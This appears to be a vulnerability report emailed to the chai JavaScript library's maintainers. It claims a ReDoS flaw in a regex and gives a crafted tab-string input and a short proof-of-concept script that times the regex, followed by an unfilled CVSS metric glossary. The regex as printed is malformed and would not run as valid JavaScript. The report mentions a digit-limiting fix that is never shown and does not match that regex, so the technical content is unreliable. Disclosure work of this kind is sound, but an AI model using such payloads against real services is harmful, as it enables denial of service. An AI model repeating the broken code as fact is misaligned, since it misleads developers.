Team : For CVE

Subject : ReDoS\_Vulnerability\_Report\_in\_the\_chai\_Module\_chai.js\_2023-09-26 011535.268209.txt

Dear chai team,

I am writing to report a potential ReDoS (Regular Expression Denial of Service) vulnerability in your chai module. It has come to my attention that the current regex implementation for parsing values in the module is susceptible to excessive backtracking, leading to potential DoS attacks.The regex implementation in question is as follows:

/\sfunction(?:\s|\s/*[^(?:\*\/)]+*/\s\*)\*([^\(\/]+)/

This vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:

'\t'.repeat(54773) + '\t/function/i'

Here is a simple PoC code to demonstrate the issue:

const protocolre = /\sfunction(?:\s|\s/*[^(?:\*\/)]+*/\s\*)\*([^\(\/]+)/;

const startTime = Date.now();

const maliciousInput = '\t'.repeat(54773) + '\t/function/i'

protocolre.test(maliciousInput);

const endTime = Date.now();

console.log("process time: ", endTime - startTime, "ms");

Modification adds a limit to the number of digits, thereby preventing the ReDoS vulnerability from occurring.

I believe it is crucial to address this issue promptly to ensure the security of your module for all users. Please let me know if you need any further information or assistance with this matter.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
